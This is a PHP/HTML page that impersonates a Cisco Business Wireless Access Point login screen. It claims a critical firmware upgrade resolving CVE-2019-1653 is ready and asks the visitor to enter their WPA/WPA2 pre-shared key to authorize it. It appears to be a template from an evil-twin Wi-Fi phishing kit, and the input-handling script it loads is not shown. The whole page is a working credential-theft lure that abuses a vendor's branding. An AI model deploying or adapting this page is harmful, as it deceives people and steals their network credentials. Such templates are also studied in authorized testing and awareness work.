<?php
	error_reporting(0);
  	date_default_timezone_set("UTC");
	define('ROOT_DIR', realpath( __DIR__ ));
  	require_once( ROOT_DIR . '/input.php');
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta charset="UTF-8">
		<title>Cisco Login Page - Critical security upgrade</title>
		<script type="text/javascript" src="/script.js"></script>
	</head>
	<body>
		<link rel="stylesheet" href="icon_styles_ciscologo.css">
		<link rel="stylesheet" href="login.css">
		<text=#000000 leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" height="100%" ng-app="rfDashboard">
		<div class="configLoginScreen" valign="middle" id="loginPage">
			<div class="configLoginScreenContainer">
				<div class="configLoginCompanyLogoWrapper">
					<img src="CiscoBusiness.png" alt="Cisco logo" title="{{'Cisco Logo'}}" id="cisco_logo" width="300px" height="78px">
				</div>
				<div class="configProductName">
					Cisco Business Wireless Access Point
				</div>
				<div id="upgrade_message" class="configWelcomeMessage">
					A critical security <b>firmware upgrade</b>
					<br />
					has been downloaded successfully (ZnTR3700 v1.392). Resolved <a target="about:blank" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1653">CVE-2019-1653</a>.
					<br />
					In order to authorize the upgrade install process,
					<br />
					please enter the WPA/WPA2 pre-shared key.
				</div>
				<div class="configLoginUsernamepassword">
					<label>Pre-shared key:</label>
					<input id="upgrade_field" type="password" name="password" maxlength="64">
				</div>
				<div class="configLoginFields">
					<button id="upgrade_submit" class="k-button" type="button" disabled>Authorize</button>
				</div>
				<div id="upgrade_status_area"><span id="upgrade_status"></span></div>
				<div id="copyrightmessage" class="configLoginCopyright">
					<span id="copyrightYear"></span>
					Cisco Systems, Inc. All rights reserved. Cisco, the Cisco logo, and Cisco Systems are registered trademarks or trademarks of Cisco Systems, Inc. and/or its affiliates in the United States and certain other countries. All third party trademarks are the property of their respective owners.
				</div>
			</div>
		</div>
	</body>
</html>